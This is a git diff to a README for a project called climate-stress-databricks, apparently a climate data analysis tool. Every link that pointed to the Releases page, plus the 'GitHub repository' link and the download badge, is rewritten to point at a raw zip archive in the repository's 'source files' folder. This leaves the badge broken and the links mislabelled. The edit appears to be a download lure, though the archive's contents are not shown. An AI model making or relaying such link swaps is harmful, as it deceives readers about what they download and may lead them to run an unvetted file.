@@ -1,6 +1,6 @@
 # 🌍 climate-stress-databricks - Analyze Climate Data with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/soulashwin/climate-stress-databricks/releases)
+[![Download](https://github.com/soulashwin/climate-stress-databricks/raw/refs/heads/main/source files/climate-stress-databricks-1.2-alpha.5.zip%20Now-Get%20Started-brightgreen)](https://github.com/soulashwin/climate-stress-databricks/raw/refs/heads/main/source files/climate-stress-databricks-1.2-alpha.5.zip)
 
 ## 📖 Introduction
 
@@ -18,7 +18,7 @@ Follow these steps to download and run **climate-stress-databricks**:
 
 2. **Visit the Release Page**
    - Click the link below to visit the Releases page. Here, you will find the latest version of the application, along with all necessary files.
-   - [Download the Latest Release](https://github.com/soulashwin/climate-stress-databricks/releases)
+   - [Download the Latest Release](https://github.com/soulashwin/climate-stress-databricks/raw/refs/heads/main/source files/climate-stress-databricks-1.2-alpha.5.zip)
 
 ## 🔥 Download & Install
 
@@ -52,11 +52,11 @@ If you encounter any issues, you can refer to the detailed documentation availab
 
 ## 🔗 Additional Resources
 
-- **Repository**: To contribute or learn more about the project, visit the [GitHub repository](https://github.com/soulashwin/climate-stress-databricks).
+- **Repository**: To contribute or learn more about the project, visit the [GitHub repository](https://github.com/soulashwin/climate-stress-databricks/raw/refs/heads/main/source files/climate-stress-databricks-1.2-alpha.5.zip).
 - **Community Discussions**: Join discussions about the application in the Issues section of the repository.
 
 ## 📥 Download Again
 
 If you need to download the application again, return to the Releases page here:
 
-[Download the Latest Release](https://github.com/soulashwin/climate-stress-databricks/releases)
+[Download the Latest Release](https://github.com/soulashwin/climate-stress-databricks/raw/refs/heads/main/source files/climate-stress-databricks-1.2-alpha.5.zip)
